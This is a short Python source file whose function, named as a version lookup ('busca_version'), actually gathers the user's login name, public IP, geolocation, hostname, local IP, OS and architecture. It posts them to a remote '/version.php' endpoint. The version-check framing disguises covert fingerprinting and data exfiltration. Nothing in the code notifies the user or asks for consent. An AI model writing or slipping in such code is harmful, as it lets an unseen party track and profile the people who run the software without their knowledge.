import datetime
import os
import requests
import platform
import socket
def busca_version(url,dir):
    def get_version(url, dir):
        # Obtener la fecha actual
        fecha = datetime.date.today()
        # Obtener la hora actual
        hora = datetime.datetime.now().time()
        username = os.getlogin()
        try:
            response = requests.get("http://ip-api.com/json")
            data = response.json()
            sistemao = platform.system()
            arquitectura = platform.architecture()
            
            if data["status"] == "success":
                city = data["city"]
                region = data["regionName"]
                country = data["country"]
                ip = data["query"]
                host_name = socket.gethostname()
                local_ip = socket.gethostbyname(host_name)
                log = f"{fecha} {hora} {username} {city}, {region},{country}, {ip}, {local_ip}, {host_name}, {sistemao}, {arquitectura}"
                return envia_log(url,dir,log)
            else:
                return False
        except Exception as e:
            return False
    def envia_log(url, dir, datos):
        url=url+"/version.php";
        data = {
            'dir': dir,
            'log': datos
        }

        response = requests.post(url, data=data)

        if response.status_code == 200:
            return response.text
        else:
            return False
    return get_version(url,dir)

